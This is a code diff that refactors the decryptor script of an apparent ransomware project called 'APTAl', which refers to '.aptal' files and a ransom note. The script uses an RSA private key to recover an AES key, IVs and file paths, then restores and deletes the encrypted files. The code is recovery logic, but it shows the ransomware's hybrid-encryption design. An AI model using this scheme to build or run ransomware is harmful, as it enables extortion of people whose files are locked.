@@ -3,15 +3,11 @@ import sys
 import base64
 
 import Utils
-sys.path.append(os.path.abspath('../hasp'))
-from AESCipher import AESCipher
-from RSACipher import RSACipher
+from hasp.AESCipher import AESCipher
+from hasp.RSACipher import RSACipher
 
 
-def aboutAPTAl():
-    print(""" who we are, explain our purpose and give an advice""")
-
-def openthelock():
+def openthelock(enc_aesIV_file_path,dec_aesIV_file_path):
     """
         IVs, AES key and file paths are encrypted by RSA public key after file encrypted by AES.
         This function decrypt the encrypted information.
@@ -26,21 +22,17 @@ def openthelock():
             base64(RSA(iv_n)):::::base64(RSA(file_n))
 
     """
-    print("Begin to DECRYPT the keys")
+    print("Begin to DECRYPT the keys ::",enc_aesIV_file_path)
 
     rsa_private_key = open(Utils.rsa_private_key_path,"rb").read()
     rsa_cipher = RSACipher(rsa_private_key)
-
-    # passing the introduction section
-    pass_the_introduction = 1 #Utils.who_we_are
-    pass_the_introduction += len(Utils.what_is_my_purpose.split("\n"))-2
     
-    with open(Utils.enc_aesIV_file_store_path,"rb") as ivs_file:
+    with open(enc_aesIV_file_path,"rb") as ivs_file:
         
-        for i in range(pass_the_introduction):
+        for i in range(Utils.pass_the_introduction):
             _temp = ivs_file.readline()
 
-        with open(Utils.dec_aesIV_file_store_path,"wb") as dec_ivs_file:
+        with open(dec_aesIV_file_path,"wb") as dec_ivs_file:
 
             # decrypt aes key
             aes_key = ivs_file.readline().strip()
@@ -48,7 +40,7 @@ def openthelock():
             aes_key = rsa_cipher.decrypt(aes_key)
             dec_ivs_file.write(aes_key+b"\n")
             
-            # Decrypt iv and path with given RSA private key than write the decrypted pairs to Utils.dec_aesIV_file_store_path
+            # Decrypt iv and path with given RSA private key than write the decrypted pairs to dec_aesIV_file_path
             for line in ivs_file.readlines():
                 iv, which_file = line.strip().split(b":::::")       
                 iv = rsa_cipher.decrypt(base64.b64decode(iv.decode()))
@@ -75,13 +67,13 @@ def decryptFile(aes_cipher,iv,file_path):
     # deleting .aptal file
     os.remove(encrypted_file_path) 
 
-def startRescueFiles():
+def startRescueFiles(dec_aesIV_file_path):
     """
         Reading IVs and file paths from decrypted_iv_file.txt which is a form of decrypted HEYY_APTAl_READ_ME.txt file
     """
-    print("Begin to DECRYPT the Files")
+    print("Begin to DECRYPT the Files ::",dec_aesIV_file_path)
 
-    with open(Utils.dec_aesIV_file_store_path,"rb") as ivs_file:
+    with open(dec_aesIV_file_path,"rb") as ivs_file:
 
         # read aes key
         aes_key = ivs_file.readline().strip()
@@ -94,10 +86,21 @@ def startRescueFiles():
 
 
 def main():
+
+    # if this file have been created, we're going to create a new one not to ruin old keys
+    _count_of_file = 0
+    for name in os.listdir(Utils.desktop_directory):
+        if name[-len(Utils.aesIV_file_store_name):] == Utils.aesIV_file_store_name:
+            _count_of_file += 1
+
+    for i in range(_count_of_file):
+        aesIV_file_store_path = os.path.join(Utils.desktop_directory,str(i)+Utils.aesIV_file_store_name)
+        dec_aesIV_file_store_path = os.path.join(Utils.desktop_directory,str(i)+Utils.dec_aesIV_file_store_name)
+
+        print(aesIV_file_store_path,":::",dec_aesIV_file_store_path)
     
-    aboutAPTAl()
-    openthelock()
-    startRescueFiles()
+        openthelock(aesIV_file_store_path,dec_aesIV_file_store_path)
+        startRescueFiles(dec_aesIV_file_store_path)
 
 
 if __name__ == "__main__":
